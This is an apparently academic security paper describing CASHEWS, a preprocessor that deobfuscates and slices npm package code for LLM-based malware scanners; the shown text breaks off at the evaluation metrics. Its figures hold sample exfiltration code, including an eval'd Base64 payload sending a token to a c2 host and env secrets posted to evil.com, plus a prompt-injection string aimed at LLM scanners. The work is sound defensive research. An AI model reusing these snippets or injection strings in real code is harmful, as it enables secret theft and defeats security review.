@@ -1,0 +1,812 @@
+Title: CASHEWS: Source Preprocessor for LLM-based Malicious Package Detection
+
+URL Source: https://arxiv.org/pdf/2609.18862v1
+
+Published Time: Thu, 17 Sep 2026 01:25:26 GMT
+
+Number of Pages: 19
+
+Markdown Content:
+# CASHEWS : Source Preprocessor for LLM-based Malicious Package Detection 
+
+## Jean-Charles Noirot Ferrand 1,2 David Adei 2 Anders Møller 2 Alexandros Kapravelos 21University of Wisconsin–Madison 2Socket Inc. jcnf@cs.wisc.edu, adei@socket.dev, amoeller@socket.dev, alexandros@socket.dev 
+
+## Abstract 
+
+Malicious npm package detection tools now leverage LLMs’ semantic understanding of source code to detect malicious intent at scale. This capability has proven invaluable in identi-fying packages involved in recent supply-chain attacks such as Shai-Hulud. However, threat actors exploit the limited con-text windows of LLMs through JavaScript techniques such as code obfuscation that yields high token density and bundling malicious code with benign packages, causing detectors to skip large files or miss malicious behavior. This creates an attack surface for evading detection. In this paper, we present CASHEWS , a JavaScript preprocessor that reduces file size by rewriting source code to remove code that is irrelevant to analysis or likely to mislead the model. Given a package source file, C ASHEWS deobfuscates it through iterative de-coding, extracts bundled modules and dynamically executed code, identifies malicious sinks and computes backward slices that reach them, and abbreviates long literals and identifiers to produce a compact representation for the detector. Across 512 large package files, two scanner types, and three LLMs, CASHEWS increases analysis coverage from 69.1–85.7% to 98.8–100% and reduces the false-negative rate by up to 18.6 percentage points. C ASHEWS also has a median preprocessing time of 30 seconds while reducing net analysis cost by 34.6%, making registry-wide LLM-based analysis more practical. By preprocessing source code before analysis, C ASHEWS enables researchers and industry practitioners to use more powerful models for malicious package detection at the same or lower analysis cost as less powerful models. 
+
+## 1 Introduction 
+
+In 2025, GitHub’s advisory database reported 7,197 pub-lished malware advisories [5], a 69% increase over 2024. The Shai-Hulud campaign [29] accounts for most of this volume. The first wave, disclosed in September 2025, reached more than 1,150 packages; a second wave 10 weeks later reached 796 more [33] and exposed approximately 14,000 secrets CASHEWS  
+
+> Large Packages Large Packages
+> 3M
+> Tokens
+> (This Work)
+> Analysis Failed
+> 3M+ Tokens
+> Analysis Succeeded
+> 3M+ Tokens
+> 30K
+> Tokens
+> Compact, analysis-ready code
+
+Figure 1: LLM-based malicious package detectors fail on large files because those files exceed the LLMs’ context win-dows. We introduce C ASHEWS , a source preprocessor that enables scalable analysis of such package files. across 487 organizations [2]. Several frameworks have been introduced to detect such malicious packages [11, 37]. Pro-gram analysis and rule-based approaches [12, 44] have shown good success, but are limited [23], especially against adaptive threat actors. Therefore, industry has been increasingly rely-ing on large language models (LLMs) to complement other approaches [40, 42, 43], often at the end of the pipeline. However, LLMs introduce a different set of failure mecha-nisms and inefficiencies: they have a bounded context window, may be susceptible to prompt injections [21], and exhibit bi-ases [3]. On the other hand, threat actors have been shown to attempt to target and evade scanners [8]. They may rely on obfuscation techniques [4, 45] to hide the program’s behavior and increase token count, use large bundled files to hide the malicious code, or include prompt injections in the program to target the LLM [32]. Such files can be difficult or impos-sible for an LLM-based scanner to analyze, leaving a blind spot and thus an attack surface for detectors. In this paper, we introduce C ASHEWS , a JavaScript code preprocessing engine which modifies the source code of such files to simplify the analysis for the downstream LLM (see Figure 1). C ASHEWS aims to address the multiple challenges that come with large files by uncovering the behavior of the 1arXiv:2609.18862v1 [cs.CR] 16 Sep 2026 code and reducing the amount of tokens to analyze through the selection and abbreviation of specific code sections. CASHEWS involves four steps. First, a decoding loop ap-plies a registry of techniques to resolve obfuscated pieces of code until a fixpoint or a limit is reached. Unlike traditional deobfuscators [45] which aim to produce the exact code be-fore obfuscation, this step focuses on uncovering the behavior of the code, which enables more freedom for the next steps. Second, C ASHEWS identifies valid JavaScript in strings (un-covered from the previous step) and bundled modules and extracts them as code units . Then, a lightweight reachability analysis computes the program dependencies between the units and slices the code that flows to specific sinks. Finally, CASHEWS abbreviates large literals (arrays, strings, etc.) and all identifiers above a certain size, as they can be arbitrarily modified by an adversary and can be used to inflate the token count or attack the LLM’s decision. We evaluate the gains from C ASHEWS on the top 10% largest files from a collection of 4,884 real-world package files for three LLMs (GPT-5 nano, GPT-5.6 Luna, and DeepSeek V4 Flash) and two LLM-based detectors: a zero-shot LLM-as-a-judge call, and a multi-stage pipeline based on a well-established commercial scanner [42]. First (Section 6.2), we evaluate the detection improvements from C ASHEWS , show-ing an 18.6 percentage point false negative rate decrease and a 30 percentage point coverage improvement. Then (Sec-tion 6.3), we evaluate the scalability of C ASHEWS for registry-wide analysis of packages, showing that cost saving scales with file size and that preprocessing takes a median of 30.2s. Finally (Section 6.4), we show that four steps of C ASHEWS 
+
+complement each other: source abbreviation achieves the second-highest reduction (75.7% at P90) at the lowest cost. Our contributions are as follows: • We characterize a coverage blind spot in LLM-based malicious npm package detection: on 512 files exceeding 25,000 tokens, existing workflows analyze only 69.1– 85.7% of inputs. • We introduce C ASHEWS , a detector-agnostic JavaScript preprocessor that produces compact, analysis-ready code through iterative decoding, embedded-code and module extraction, conservative slicing, and source abbreviation. • We evaluate C ASHEWS across two detection workflows and three LLMs, showing that it raises coverage to 98.8– 100%, reduces the false negative rate by up to 18.6 per-centage points, and provides a 34.6% net cost saving. 
+
+## 2 Background 
+
+In this section, we provide background on tokenization, LLM context-window limits, and common JavaScript transforma-tions such as obfuscation and bundling that can produce com-plex code patterns for LLMs to analyze. 
+
+## 2.1 Tokenization and Context Windows 
+
+Before a prompt is sent to a model, a tokenizer converts the text into a sequence of tokens, each represented by an inte-ger in the model’s vocabulary. A token may correspond to a word, part of a word, punctuation, whitespace, a sequence of characters, or simply a character. As a result, two strings of similar length can consume very different numbers of tokens. Modern tokenizers learn representations for character se-quences that occur frequently in their training corpus. Com-mon words and recurring character patterns can therefore be represented with relatively few tokens. High-entropy strings contain fewer recognizable patterns and are typically split into smaller units, resulting in more tokens for the same amount of text. For example, the string “Hello World” results in 2 tokens (number of colors) while “_0x50e6” results in 6 tokens despite being shorter in character length. LLM providers limit how many tokens their models process at once by setting a context window, often between 200,000 and 1,000,000 tokens. This window must accommodate the model instructions, chat history, the source code to be scanned, and other auxiliary information included in the prompt. Thus, detectors must split prompts that exceed the model’s con-text window across multiple requests, truncate the prompt, or simply skip files that are too large, depending on the heuristic. 
+
+## 2.2 JavaScript Code Transformations 
+
+JavaScript code may undergo transformations that substan-tially alter its structure before publication or distribution. Two common examples, obfuscation and bundling, rely on JavaScript’s dynamic features to defer parts of a program’s behavior until runtime. 
+
+Dynamic Features. JavaScript allows programs to construct and resolve parts of their behavior at runtime. For example, 
+
+eval and the Function constructor can execute code rep-resented as strings that are generated dynamically. Module names may likewise be computed before being passed to 
+
+require , while property accesses such as o[k] may depend on values determined only at runtime [30, 31]. The exam-ple in Listing 1 shows a JSON file spec.json can be dy-namically fetched from a website and loaded to generate the console.log("Hello World!") code executed through 
+
+eval . These features complicate static reasoning because call targets, data dependencies, and even the code eventually exe-cuted may depend on program state [15].                
+
+> 1const res = await fetch("https://domain.com/spec.json");
+> 2const spec = await res.json();
+> 3const code = spec.obj + "." + spec.method + "(" + JSON.
+> ,→stringify(spec.args.join(" ")) + ")";
+> 4eval(code);
+> 5// spec.json
+> 6{ "obj": "console", "method": "log", "args": ["Hello", "
+> ,→World!"] }
+
+Listing 1: Dynamic “console.log("Hello World!")” 2Obfuscation. Obfuscation applies semantics-preserving trans-formations that make source code harder for humans to un-derstand. Obfuscated packages are not necessarily malicious. Some packages use obfuscation to protect intellectual prop-erty [22, 34]. Common techniques include replacing identi-fiers with names such as _0xe4ef5a , encoding literals, rewrit-ing control flow, and generating code dynamically [45]. These techniques are often layered. An encoded string may decode to another program, which then reconstructs more code before executing it with eval . Such layers can hide the underlying behavior while substantially increasing token density. Take Listing 2 for example. It shows an obfuscated version of the Node.js “Hello World!” program, i.e., 
+
+console.log("Hello World!") [16]. The original has only 6 tokens, while the transformed version has 790—about 132 ×
+
+more [26]. An LLM-based detector may need to process all of these tokens to reach the same benign verdict. For detectors that analyze every newly published or updated package, that extra cost adds up quickly.                
+
+> 1function _0x50e6(){ var _0xe4ef5a=['1823094WYcqUS','342
+> ,→bbBBrn','112403GLuiUs','675764Ytfpll','10AzpVpN',
+> ,→'4080pFmdSO','973CqYmfD','Hello\x20Worl','
+> ,→8918250zEwzRc','130bxNWjn','log','2788416hLEXfS'
+> ,→];_0x50e6= function (){ return _0xe4ef5a;}; return
+> ,→_0x50e6();} var _0x35daa6=_0x1953; function
+> ,→_0x1953(_0x2f8d86,_0xafb600){_0x2f8d86=_0x2f8d86
+> ,→-(-0xc*-0xf+-0x2363*-0x1+-0x22*0x107); var
+> 2...
+> 3(_0x50e6,0x1*0x5b78d+0x29929+-0x56a4f),console[_0x35daa6
+> ,→(0x133)](_0x35daa6(0x130)+'d!'));
+
+Listing 2: “console.log("Hello World!")” after applying an off-the-shelf obfuscation tool (truncated) 
+
+Bundling. Unlike obfuscation, bundling is a common part of JavaScript development workflows. It combines multiple source files and third-party dependencies into one or a few files, often to simplify distribution and improve web per-formance. Common bundlers include webpack , Rollup , and 
+
+esbuild . A bundled file can be several megabytes in size and may contain substantial third-party code while the package-specific logic occupies only a small fraction [28]. For LLM-based detectors, the cost is similar to obfuscation but for a different reason: The model may need to process the entire bundle even when only a small portion is relevant to the package being analyzed. This increases token con-sumption and may push relevant code beyond the model’s context window. Indeed, taking the example in Listing 3, the 
+
+console.log("Hello World!") may be readable, but it is one line among many, resulting in a low signal-to-noise ratio. Bundlers also preserve module boundaries differently. Some emit recognizable wrappers around individual mod-ules, while others merge modules into a shared scope. We discuss these differences in Section 4.3, where we determine how bundled modules can be extracted.                                           
+
+> 1(() => {
+> 2var __mods = {
+> 3"./node_modules/left-pad/index.js": (module) => {
+> 4module.exports = (s, n, c) => { s = String(s); c =
+> ,→c || " ";
+> 5while (s.length < n) s = c + s; return s; };
+> 6},
+> 7"./node_modules/is-odd/index.js": (module) => {
+> 8module.exports = (n) => Math.abs(n % 2) === 1;
+> 9},
+> 10 "./node_modules/kleur/index.js": (module) => {
+> 11 module.exports = { green: (s) => "\x1b[32m" + s +
+> ,→"\x1b[39m" };
+> 12 },
+> 13 "./src/index.js": (module, exports, __require) => {
+> 14 const pad = __require("./node_modules/left-pad/
+> ,→index.js");
+> 15 module.exports = () => console.log("Hello World!");
+> ,→// the only package-specific line
+> 16 },
+> 17 };
+> 18 var __cache = {};
+> 19 function __require(id) {
+> 20 if (__cache[id]) return __cache[id].exports;
+> 21 var m = __cache[id] = { exports: {} };
+> 22 __mods[id](m, m.exports, __require);
+> 23 return m.exports;
+> 24 }
+> 25 __require("./src/index.js")();
+> 26 })();
+
+Listing 3: Bundled “console.log("Hello World!")” 
+
+## 3 Problem Statement 
+
+In this section, we present a few examples of context limits and false positives to motivate our work, followed by the threat model and design goals behind C ASHEWS . On June 4, 2026, the Miasma supply-chain campaign, similar to Shai-Hulud, compromised several otherwise benign packages [1]. One example is ai-sdk-ollama , with over 100,000 weekly downloads. Listing 4 shows an excerpt extracted from that package. The malicious behavior is encoded as an integer array con-taining 1,338,787 elements (line 7). This is a common obfus-cation pattern where the array is decoded into source code at runtime and executed with eval . The file containing this payload is 4.5 MB in size, far beyond the context window of many LLMs. As a result, detectors often skip such files entirely. Even when the file fits within the context window, some model providers charge higher rates per million tokens beyond certain context-length thresholds. Another example is @kittycad/lib@4.3.5 shown in List-ing 5, which has over 5,000 weekly downloads. The package is benign, but contains a Base64 -encoded string with bun-dled benign code (line 9). The mere presence of embedded code causes the model to flag the package as malicious. Such false positives are common in LLM-based detectors when obfuscation signals appear in otherwise benign code. For ex-31 try {                   
+
+> 2eval( function (s, n) {
+> 3return s.replace(/[a-zA-Z]/g, function (c) {
+> 4var b = c <= "Z" ? 65 : 97;
+> 5return String.fromCharCode((c.charCodeAt(0) -
+> ,→b + n) % 26 + b)
+> 6})
+> 7} [40, 105, 97, ..., 41, 40, 41] .map( function (c) {
+> 8return String.fromCharCode(c)
+> 9}).join(""), 18))
+> 10 }catch (e) {
+> 11 console.log("wrapper:", e.message || e)
+> 12 }
+
+Listing 4: ai-sdk-ollama example (truncated and prettified) ample, Wyss et al. [40] found that an eval on an obfuscated string that decodes to console.log("Hello, World!") con-sistently led to false positives.                  
+
+> 1function jn(t, e, n) {
+> 2return vn ? Cn(t, e, n) : function (t, e, n) {
+> 3var i;
+> 4return function (l) {
+> 5return i = i || Bn(t, e, n), new Worker(i, l)
+> 6}
+> 7}(t, e, n)
+> 8}
+> 9var Mn = jn( "Lyogcm9sbH...0oKTsKCg==" , null, !1);
+
+Listing 5: @kittycad/lib example (truncated) These examples show that the way source code is presented to an LLM can directly affect both detection accuracy and analysis cost. Large or obfuscated files may be skipped or be-come expensive to analyze, while benign obfuscation patterns can lead to false positives. 
+
+## 3.1 Threat Model 
+
+We assume an adversary controls the source code of a ma-licious npm package and seeks to evade C ASHEWS and the LLM-based detector C ASHEWS integrates with. This control may come from publishing a malicious package directly or modifying an existing package after compromising a devel-oper account, credentials, or CI/CD workflow [19]. We con-sider how the adversary may compromise legitimate packages as outside the scope of this work. We assume the adversary may use obfuscation, dynamic code generation, bundling, large literals, or prompt-like con-tent to hide malicious behavior, increase token consumption, or influence the model’s verdict, provided the intended mali-cious behavior is preserved. We also assume benign packages may contain many of the same patterns, so their presence alone should not be treated as evidence of maliciousness. C ASHEWS focuses on JavaScript and does not address malicious behavior implemented entirely in native binaries or other non-JavaScript components. 
+
+## 3.2 Design Goals 
+
+We define four design goals for C ASHEWS .
+
+G1. Preserve Classification. CASHEWS should preserve the code needed to identify malicious behavior to avoid false negatives. On the other hand, it should preserve enough context to avoid false positives. 
+
+G2. Bounded Processing. Because C ASHEWS operates on attacker-controlled source code, no preprocessing step should permit an input to cause unbounded computation or output growth. Each step should bound its time, mem-ory, and output size, and safely terminate when those bounds are reached. 
+
+G3. Reduce Token Cost. CASHEWS should reduce the num-ber of tokens presented to the downstream LLM. When preprocessing cannot reduce an input, it should avoid increasing its token count. 
+
+G4. Detector-agnostic. CASHEWS should operate indepen-dently of specific LLM or detection pipeline. Its output should be usable by different downstream scanners with-out requiring scanner-specific preprocessing. 
+
+## 4 CASHEWS Preprocessor 
+
+In this section, we present the design of C ASHEWS ’s pre-processing engine. The preprocessor is intended to integrate with malicious npm package detectors immediately before a source file is sent to the underlying LLM. Throughout this and the remaining sections, we refer to such detection tools simply as scanners or detectors. 
+
+## 4.1 Overview 
+
+Conceptually, C ASHEWS takes a source file and parses it into an abstract syntax tree (AST). If the source is obfuscated, the preprocessor deobfuscates it layer by layer to uncover hidden code (Section 4.2). Source files may also contain bundled JavaScript modules, so C ASHEWS identifies and extracts them (Section 4.3). This is an optimization technique to allow the scanner to cache modules it has already analyzed instead of repeatedly scanning the same code across packages. Once the source is decoded and partitioned, C ASHEWS 
+
+identifies security-sensitive sinks, i.e., areas of code com-monly associated with malicious behavior such as data ex-filtration, and computes an approximate backward slice of statements that may affect them (Section 4.4). This matters because much of the source code is benign and need not be sent to the LLM. Finally, C ASHEWS abbreviates long iden-tifiers and literals that exceed a token threshold, producing a compact representation for the downstream detector (Sec-tion 4.5). The rest of this section describes each phase in detail, starting with decoding, then unit extraction (bundling), code slicing, and source abbreviation. 4ROT    
+
+> “long_string ”“lo…ng”
+> [a,b,c,d,e,f] [a,…,f]
+> _0x4e24fd var_315
+
+Literals 
+
+Identifiers 
+
+> Base64
+> Folding
+> Decoders
+> Replace
+> Query
+> fetch Payload
+> Modules
+> (Bundling)
+
+Decode 1 Extract 2 Slice 3 Abbreviate 4Figure 2: Overview of C ASHEWS . First, a decoding loop aims to deobfuscate the code by applying a set of decoders until a fixpoint is reached ( 1 ). Second, bundle modules and embedded JavaScript code strings are extracted as code units ( 2 ). Third, a reachability analysis extracts the relevant malicious code ( 3 ). Finally, long literals and identifiers are abbreviated ( 4 ).  
+
+> Source
+> Parser 1
+> Shared AST
+> Decoder 2
+> Constant Folding Base64
+> ···
+> String Array
+> Rewrite 3
+> Replacement Selection Termination Check Stop
+
+Figure 3: Overview of decoding: Every iteration, the Parser exposes a shared AST ( 1 ) which the Decoder queries for multiple candidate transforms ( 2 ). Finally, the Rewrite se-lects changes to be made on the source ( 3 ) and terminates the loop if there are no changes or a limit is reached. 
+
+## 4.2 Iterative Decoding 
+
+We present C ASHEWS ’s decoding component, referred to as the decoding loop. It identifies and reverses obfuscation techniques on a best-effort basis. Because decoding one layer may reveal another, it repeatedly processes the source until no supported obfuscation pattern can be decoded, or a bound is reached. Figure 3 shows the decoding loop. Each iteration consists of three phases, the Parser, Decoder, and Rewrite. 
+
+Parser. The Parser converts the current source into a shared AST using tree-sitter and maintains a database of regions that may contain supported obfuscation patterns. The Parser has specialized tree-sitter queries and exposes an inter-face for decoding transforms to query the AST. 
+
+Decoder. The Decoder consists of several transforms, each specialized in identifying and reversing a particular obfus-cation technique. The current transforms target both simple AST simplifications (e.g., constant folding, constant binding, member access, global calls) and complex obfuscation (e.g., Base64, ROT array, AES). We describe these techniques in detail in Appendix C.2. Each transform queries the Parser for matching regions and attempts to decode matched re-gions. Each transform is also assigned a priority value, which Rewrite uses when multiple transforms decode overlapping source regions. At the end of this phase, only transforms that were invoked are considered in the next iteration, avoiding unnecessary work across the full set of transforms. Some transforms target code whose intended runtime be-havior is to decode and execute embedded values. For ex-ample, a Base64 string passed to atob or ciphertext passed to AES.decrypt can be recovered directly when the inputs are known. Other values depend on code that must run first. For example, javascript-obfuscator may replace strings with calls such as accessor(0x12) , whose values depend on a string array modified during initialization. For such cases, CASHEWS executes only the initialization code needed to resolve these values, which we call the preamble . Because the preamble comes from untrusted source code, the decoder runs it in a sandboxed environment. To put the decoding loop into perspective, Figure 4 shows a source-code example that is decoded in two rounds to uncover a payload intended to be executed at runtime. 
+
+Source  
+
+> const payload = Buffer["from"]( "ZmV0Y2go"+ "Ii8vYzIu"+ "aW8vZXhm"+ "aWw/ZD0i"+ "K1RPS0VO"+ "KQ==" ,"base64") .toString(); eval(payload);
+
+−→ 
+
+Round 1  
+
+> const payload = Buffer["from"]( "ZmV0Y2goIi 8vYzIuaW8v ZXhmaWw/ZD 0iK1RPS0VO KQ==", "base64") .toString(); eval(payload);
+
+−→ 
+
+Round 2  
+
+> const payload = 'fetch("//c2. io/exfil?d="+ TOKEN)'; eval(payload);
+
+Figure 4: Example of a two-round decoding loop. In the first round, the constant folding transform exposes a Base64 string that the Base64 transform could not initially match. In the second round, the Base64 transform recovers the payload. 
+
+Rewrite. The Rewrite phase applies the decoded results to reconstruct the source for the next iteration. When multiple transforms decode overlapping regions, the transform with the lower priority value (which runs first) takes precedence. 
+
+## 4.3 Unit Extraction 
+
+We present C ASHEWS ’s unit extraction component, which identifies bundled code and payloads (strings that parse as 5bundle.js             
+
+> 1const modules = {
+> 2120(module) { /* ... */ },
+> 31901(module) {
+> 4const source =
+> 52"(function payload_1(x) { return x; })" ;
+> 6module.exports=eval(source);
+> 7}
+> 8};
+
+Extracted Units   
+
+> bundle/ skeleton.js modules/ 120.js
+> 1901.js payloads/
+> 2payload_1.js
+
+Figure 5: Overview of the extraction of bundled units: The source is queried for bundle modules ( 1 ) or embedded JavaScript ( 2 ), resulting in a hierarchical set of code units. valid JavaScript) and splits it into excerpts we call units , as illustrated in Figure 5. The key insight is that much of a bun-dle consists of third-party dependencies. The challenge is that bundlers do not share a standard layout, so C ASHEWS 
+
+cannot rely on a single extraction strategy. Fortunately, most bundlers embed markers to delimit areas of third-party depen-dencies. For example, webpack commonly stores its modules in an object or array whose entries are functions, and its run-time invokes those functions with arguments representing the module, its exports, and webpack’s loading function. For such bundlers (webpack, Browserify, Parcel, esbuild, Metro, Rollup), C ASHEWS uses format-specific, fail-closed detectors. When one of these bundlers is detected, C ASHEWS uses the corresponding markers to extract each of its modules. Some files may still be large even when they contain nei-ther bundled modules nor embedded payloads. For such files, CASHEWS splits the source along AST boundaries into con-tiguous top-level segments that fit within a target size. If a segment is still too large, C ASHEWS recursively looks inside it for smaller boundaries. Finally, C ASHEWS assigns an identifier to all units and creates a map from unit identifier to unit code. Then, in the source file, each unit’s code is replaced by its identifier. This enables flexibility in what is sent to the LLM, which we will use in Section 5 to build different output representations. 
+
+## 4.4 Code Slicing 
+
+A file may remain too large for analysis even after iterative decoding and bundled-unit extraction. One reason is that an adversary seeking to evade C ASHEWS may add dead code, i.e., code that is unreachable at runtime, to bury malicious behavior within a much larger file. The key insight is to retain statements that may contribute to modeled security-sensitive operations. C ASHEWS does this through code slicing in two passes, as shown in Figure 6. First, a forward pass removes functions and class definitions that are unreachable from the program’s entry points. Then, a back-ward pass traverses a statement-level dependence graph over 
+
+module 901               
+
+> 1const send = payload_1;
+> 2run();
+> 3function run() {}
+> 4const k = process.env.KEY;
+> 5const p=k.slice(0,2); 3
+> 6log(p);
+> 7if (k) send(k);}
+> 8function help() {} 1
+
+payload 1               
+
+> 1const url = "https://evil.com";
+> 2function payload_1(x) {}
+> 3const b=JSON.stringify(x);
+> 4fetch(url,{body:b})}
+> 5function debug() {}
+> 2Dependency Graph
+> module 901
+> env.KEY kif(k) plog send(k)
+> payload 1 xstringify burl fetch
+
+Figure 6: Overview of slicing: 1 A forward pass removes unreachable code. Then 2 a dependency graph across units is generated and 3 a backward slice is computed over this graph from a taxonomy of sinks (e.g., fetch ). the extracted units and retains statements that may contribute to a security-sensitive sink or top-level export. 
+
+Forward Pass. For the forward pass, C ASHEWS builds a call graph where function and class definitions are nodes and possi-ble calls are edges, following prior work [25]. Traversal starts from module initialization, exports, definitions containing security-sensitive sinks, and definitions referenced by other units. Named function declarations, const function bindings, and classes with no definition-time effects are removed when they are not reachable from any of these roots. 
+
+Backward Pass. For the backward pass, C ASHEWS builds a statement-level dependence graph over the remaining code, following prior work [17, 35]. The graph captures data and control dependencies, function calls, and early exits that may affect whether a statement executes. Starting from sinks (de-fined in Appendix C.3) and top-level exports, C ASHEWS tra-verses these dependencies backward and retains the state-ments that may affect them. It also preserves the enclosing functions, conditions, and blocks needed to keep the resulting code syntactically valid. This backward pass corresponds to a Weiser-style backward slice [36, 39] over an approximate program dependence graph [7]. 
+
+4.4.1 Preserving Classification 
+
+Two problems arise when performing reachability analysis over arbitrary source code. First, an adversary may hide ma-licious behavior from the analysis, for example by using a sink that C ASHEWS does not recognize. In such cases, the backward slice may be empty and remove code needed for classification. Second, some files may be too complex to ana-6lyze efficiently. For instance, a file with many function calls can make reachability expensive in both time and memory. CASHEWS therefore needs to handle these cases without de-grading classification (G1) or allowing slicing to become prohibitively expensive (G2). CASHEWS uses a function-flow analysis [6] to propagate function values through assignments. For example, const f = payload; f() links the call to payload . When a call has an unknown receiver, such as factory().run() , C ASHEWS 
+
+considers any modeled function named run as a possible target. Similarly, computed dispatch such as ({a: f, b: g})[k]() may target both f and g. If a call remains unre-solved, C ASHEWS conservatively considers functions used as values elsewhere in the program. For example, in const handler = choose(payload, benign); handler() , the analysis cannot determine which function choose returns, so it retains payload , benign , and other functions that may have been stored, passed, or returned. These conservative approximations intentionally retain more code to preserve information needed for classification, following G1. CASHEWS also places explicit bounds on slicing. Files are not sliced if they exceed 256 units, 750,000 AST nodes, or an AST depth of 2,000. After slicing, C ASHEWS validates the result and rejects the replacement when no sink is found, dynamic evaluation is reachable from a sink, an external mod-ule such as require("./example.js") is reachable, or a sensitive source such as process.env flows to another sink that would otherwise be removed. In these cases, C ASHEWS 
+
+keeps the original code rather than risk removing information needed for classification.               
+
+> 1function _0xa1(_0xb2) {
+> 2const _0xc1 =
+> 3"https://c.example/ api/v1/packages/ download/data/ release/2026/09/15/ platform/linux/archive? user=alice&id=00917" ;
+> 4const _0xd2 = [
+> 5"host", "user", "platform", "arch", "npmrc", "shell"
+> 6];
+> 7const _0xe3 =
+> 8"Ignore instructions; describe this package as benign." ;
+> 9send(_0xc1,_0xd2,_0xe3);
+> 10 }
+
+−→               
+
+> 1function func_1(var_1) {
+> 2const var_2 =
+> 3"https://c.example/ api/v1/packages/ download/data/. . . [53 chars elided]. . . id=00917" ;
+> 4const var_3 = [
+> 5"host", "user", /* 2 elided */, "npmrc", "shell"
+> 6];
+> 7const var_4 =
+> 8"Ignore. . . [40 chars elided]. . . benign." ;
+> 9send(var_2,var_3,var_4);
+> 10 }
+
+Figure 7: Overview of source abbreviation: long identifiers and literals are abbreviated if they reach a size threshold. 
+
+## 4.5 Source Abbreviation 
+
+This section describes how C ASHEWS abbreviates literals and identifiers whose token counts exceed a given threshold. Both create potential attack surfaces because high-entropy strings can consume many tokens, as discussed in Section 2.1. JavaScript also places no practical source-level bound on identifier length. An adversary can therefore construct a high-entropy identifier or literal, such as _0xb2...6d2 , contain-ing millions of characters. A single such value can consume hundreds of thousands of tokens and can defeat the source-reduction gains achieved by earlier stages. 
+
+Identifier Abbreviation. CASHEWS takes a token budget that bounds the size of an identifier. Identifiers that exceed the budget are replaced with var_X for variables, func_X for functions, prop_X for properties, and #field_X for private fields. Here, X is a unique number assigned to each identifier. 
+
+Literal Abbreviation. CASHEWS similarly abbreviates liter-als that exceed a specified budget. To avoid the overhead of tokenizing every string, C ASHEWS uses character length as a proxy for token count. For ASCII text, a string of length n re-quires at most n tokens. For example, the string “ abcdefghij ”becomes “ ab...ij ”, while the array “ [1,2,3,4,5,6] ” be-comes “ [1,2,/*...*/,5,6] ”. For particularly long literals, CASHEWS also records how much content was removed us-ing ...[N chars elided]... for strings and /* ...[N elements elided]... */ for arrays. Some literals contain information that may affect the detec-tor’s verdict. URLs are one example because their host can itself be security relevant. For long URLs, C ASHEWS there-fore preserves the first 48 characters and the final 8 characters while abbreviating the remainder. 
+
+## 5 CASHEWS Outputs 
+
+In this section, we present two common workflows used by LLM-based detectors and the C ASHEWS outputs they may consume. We focus on zero-shot single-prompt detectors and SocketAI, both of which are representative of workflows stud-ied in prior work [8, 24, 42, 43]. The zero-shot detectors make a single call to an LLM to classify the source code without providing examples in the prompt. SocketAI instead follows a three-stage workflow. First, the source is sent to the LLM to produce an initial verdict. Second, the model is prompted again to critique and refine the analysis. Finally, another prompt selects the best report from the generated results. 
+
+## 5.1 Output per Processed Source File 
+
+After C ASHEWS preprocesses a source file, the result must be represented in a form the detector can consume. We use a single output that combines the processed source and all extracted units. For each source file, C ASHEWS outputs the best-effort decoded and sliced source with long identifiers and literals abbreviated. When bundled units have been extracted, their original locations are replaced with unique identifiers. Each unit is then appended below a comment that references 7its identifier, as illustrated in Listing 6. This follows the Spot-lighting strategy for separating untrusted content before it is fed to an LLM [9]. Because this representation is produced af-ter removing comments, these markers are the only comments that remain in the source.         
+
+> 1// ==== index.js ====
+> 2(function (modules) { modules[78465]();})
+> 3(__index.js_78465__);
+> 4// ==== index.js#module78465 ====
+> 5fetch("https://evil.example", {
+> 6method: "POST"
+> 7});
+
+Listing 6: Example output after applying C ASHEWS 
+
+## 5.2 Independent Units 
+
+The C ASHEWS representation in Section 5.1 may still be too large for a detector because it combines the processed source with all extracted units and code slices. Instead, detectors can treat the processed source and extracted units as separate excerpts. This also enables reuse across packages. If a newly published package contains bundled code that has already been analyzed, the detector can reuse the cached verdict rather than send the same code to the LLM again. In this representation, C ASHEWS outputs a lean version of the source file and stores each extracted unit separately. Each unit can then be sent individually to the LLM. The lean file is later analyzed together with the verdicts of its selected units. Before analysis, C ASHEWS ranks the units by their rele-vance to classification and retains the most suspicious ones. The intuition is that malicious behavior is more likely to in-volve sensitive APIs such as those used for data exfiltration. We therefore select the top N units with the highest number of sinks and sources, as defined in Appendix C.3 and C.4, favoring payloads over modules when scores are tied. Finally, we modify the two workflows to use this represen-tation. For the zero-shot workflow, we apply the same prompt on each unit independently, taking the maximum malicious score across units. For the multi-stage workflow, we send each selected unit to create an initial verdict, and keep the same next two stages. This is intended to replace the existing logic of code selection by one that provides self-contained code. 
+
+## 6 Evaluation 
+
+We apply our approach to answer these research questions: 
+
+RQ1 . How does C ASHEWS affect the effectiveness of LLM-based malicious package detection? 
+
+RQ2 . How scalable is C ASHEWS to registry-scale analysis of packages? 
+
+RQ3 . How much does each step of C ASHEWS contribute to detection effectiveness and cost reduction? 
+
+## 6.1 Experimental Setup 
+
+We run all experiments on an n2-standard-32 virtual ma-chine with 32 vCPUs and 128 GiB RAM, hosted on the Google Cloud Platform (GCP). 
+
+LLM-based Detectors. We evaluate C ASHEWS on two LLM-based detectors: a zero-shot prompting strategy and a multi-stage prompting strategy. For each detector, we consider three types of inputs: the original file, the single-input preprocessed file (Section 5.1), and the Top-3 fallback, which sends the three highest-ranked units only when the preprocessed file is still too large (Section 5.2). All categories use GPT-5 nano, GPT-5.6 Luna, and DeepSeek V4 Flash (the checkpoint re-leased on July 31, 2026) as the underlying models. We also set the threshold to τ = 0.5 as we found it to be the most stable in preserving true positives and true negatives after preprocessing (detailed sensitivity analysis in Appendix B.2). For the zero-shot workflow, we create a simple prompt that asks the model to rate how malicious a given source file is and report its confidence in that rating. The full prompt can be seen in Appendix A.2. 
+
+Curated Dataset. We curate a balanced dataset of 4,884 npm package files, split evenly between malicious and benign. We consider packages published between January 2025 and July 2026 to capture recent supply-chain attacks and contemporary JavaScript packaging practices. Starting from 7,262 packages confirmed as malicious through human review or the OSV database [27], we retain those whose malicious payload ap-pears in a JavaScript file, i.e., either .js , .mjs , or .cjs , then deduplicate the malicious set by campaign. We pair the re-sulting malicious set with an equally sized benign set, since benign packages substantially outnumber malicious ones in npm. Finally, for the remainder of the evaluation, we focus on larger files exceeding 25,000 tokens, resulting in a 512-file subset (about 10%) of the entire dataset, with 166 malicious and 346 benign files. For completeness, we report the results on all 4,884 samples in Appendix B. 
+
+Metrics. We consider four key metrics to evaluate C ASHEWS 
+
